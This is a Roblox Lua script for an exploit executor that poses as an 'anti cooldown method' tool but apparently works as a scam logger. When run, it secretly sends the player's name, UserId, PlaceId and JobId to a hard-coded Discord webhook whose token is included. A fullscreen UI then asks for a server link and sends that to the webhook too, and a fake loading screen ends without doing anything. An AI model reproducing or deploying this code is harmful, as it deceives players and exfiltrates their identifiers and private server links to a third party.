-- MÉTODO ANTI COOLDOWN
-- DELTA EXECUTOR
-- UI FULLSCREEN + WEBHOOK LOG (FIXED)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- WEBHOOK
local WEBHOOK_URL = "https://discord.com/api/webhooks/1462848180566626410/A0RJNAeALx9_qOV2eWw2IPKhU5LrJ4CfbAXEiskb9Fh9wO-z9efv95wT8YzJU69pMivc"

-- REQUEST (DELTA REAL)
local req =
	request or
	http_request or
	(syn and syn.request)

-- FUNÇÃO DE LOG (GARANTIDA)
local function sendLog(serverLink)
	if not req then return end

	local payload = {
		username = "Anti Cooldown Logger",
		embeds = {{
			title = "Novo Log",
			color = 16711680,
			fields = {
				{ name = "Player", value = player.Name, inline = true },
				{ name = "UserId", value = tostring(player.UserId), inline = true },
				{ name = "PlaceId", value = tostring(game.PlaceId), inline = true },
				{ name = "JobId", value = tostring(game.JobId), inline = false },
				{ name = "Link do Servidor", value = serverLink or "Não informado", inline = false }
			},
			footer = { text = os.date("%d/%m/%Y %H:%M:%S") }
		}}
	}

	pcall(function()
		req({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = HttpService:JSONEncode(payload)
		})
	end)
end

-- ENVIA AO EXECUTAR
sendLog("Executado")

-- ================= UI FULL BLOCK =================

local gui = Instance.new("ScreenGui")
gui.Name = "AntiCooldownUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 1000000
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.Modal = true
gui.Parent = player:WaitForChild("PlayerGui")

local blocker = Instance.new("Frame", gui)
blocker.Size = UDim2.fromScale(1,1)
blocker.Position = UDim2.fromScale(0,0)
blocker.BackgroundColor3 = Color3.new(0,0,0)
blocker.ZIndex = 1000001
blocker.Active = true
blocker.Selectable = true

local title = Instance.new("TextLabel", blocker)
title.Size = UDim2.new(1,0,0,80)
title.Position = UDim2.new(0,0,0.15,0)
title.BackgroundTransparency = 1
title.Text = "MÉTODO ANTI COOLDOWN"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.ZIndex = 1000002

local input = Instance.new("TextBox", blocker)
input.Size = UDim2.new(0.7,0,0,60)
input.Position = UDim2.new(0.15,0,0.4,0)
input.PlaceholderText = "Cole o link do servidor aqui"
input.Text = ""
input.TextScaled = true
input.Font = Enum.Font.Gotham
input.BackgroundColor3 = Color3.fromRGB(15,15,15)
input.TextColor3 = Color3.new(1,1,1)
input.PlaceholderColor3 = Color3.fromRGB(150,150,150)
input.ZIndex = 1000002

local button = Instance.new("TextButton", blocker)
button.Size = UDim2.new(0.4,0,0,60)
button.Position = UDim2.new(0.3,0,0.55,0)
button.Text = "INICIAR MÉTODO"
button.TextScaled = true
button.Font = Enum.Font.GothamBold
button.BackgroundColor3 = Color3.fromRGB(40,40,40)
button.TextColor3 = Color3.new(1,1,1)
button.ZIndex = 1000002

-- LOADING
local loading = Instance.new("Frame", gui)
loading.Size = UDim2.fromScale(1,1)
loading.BackgroundColor3 = Color3.new(0,0,0)
loading.Visible = false
loading.ZIndex = 1000003
loading.Active = true

local loadingText = Instance.new("TextLabel", loading)
loadingText.Size = UDim2.new(1,0,0,80)
loadingText.Position = UDim2.new(0,0,0.45,0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Selecionando players..."
loadingText.TextScaled = true
loadingText.Font = Enum.Font.GothamBold
loadingText.TextColor3 = Color3.new(1,1,1)
loadingText.ZIndex = 1000004

button.MouseButton1Click:Connect(function()
	if input.Text == "" then return end

	blocker.Visible = false
	loading.Visible = true

	sendLog(input.Text)

	local tempo = math.random(60,300)
	task.delay(tempo,function()
		loadingText.Text = "Processo concluído."
		task.wait(2)
		gui:Destroy()
	end)
end)
